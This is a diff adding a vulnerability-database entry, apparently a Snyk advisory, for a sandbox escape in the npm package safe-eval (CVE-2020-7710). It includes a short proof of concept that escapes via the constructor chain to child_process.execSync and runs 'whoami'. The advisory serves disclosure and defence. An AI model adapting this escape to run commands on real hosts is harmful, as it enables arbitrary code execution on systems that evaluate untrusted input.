@@ -89,3 +89,31 @@
   - https://github.com/hacksparrow/safe-eval/issues/5
   - https://github.com/patriksimek/vm2/issues/59
   source_url: https://snyk.io/vuln/npm:safe-eval:20170830
+- id: snykio:npm:safe-eval:608076
+  title: Sandbox Escape
+  description: "[safe-eval][1] is a Safer version of eval()\n\nAffected versions of
+    this package are vulnerable to Sandbox Escape. It\nis possible for an attacker
+    to run an arbitrary command on the host\nmachine.\n\n### POC by Anirudh Anand
+    (for node `12.13.0`)   {#poc-by-anirudh-anand-for-node-12130}\n\n    const safeEval
+    = require('safe-eval');\n    \n    const theFunction = function() {\n       const
+    bad = new Error();\n       bad.__proto__ = null;\n       bad.stack = {\n          match(outer)
+    {\n             throw outer.constructor.constructor(\"return process\")().mainModule.require('child_process').execSync('whoami').toString();\n
+    \         }\n       };\n       return bad;\n    };\n    \n    const untrusted
+    = `(${theFunction})()`;\n    console.log(safeEval(untrusted));\n\n\n\n[1]: https://github.com/hacksparrow/safe-eval\n"
+  affected_package: safe-eval
+  vulnerable_versions:
+  - "*"
+  severity: high
+  package_manager: npm
+  cve:
+  - CVE-2020-7710
+  cwe:
+  - CWE-265
+  disclosed_date: 2020-02-28
+  created_date: 2020-08-21
+  last_modified_date: 2020-08-21
+  credit:
+  - Anirudh Anand
+  references:
+  - https://github.com/hacksparrow/safe-eval/issues/19
+  source_url: https://snyk.io/vuln/SNYK-JS-SAFEEVAL-608076
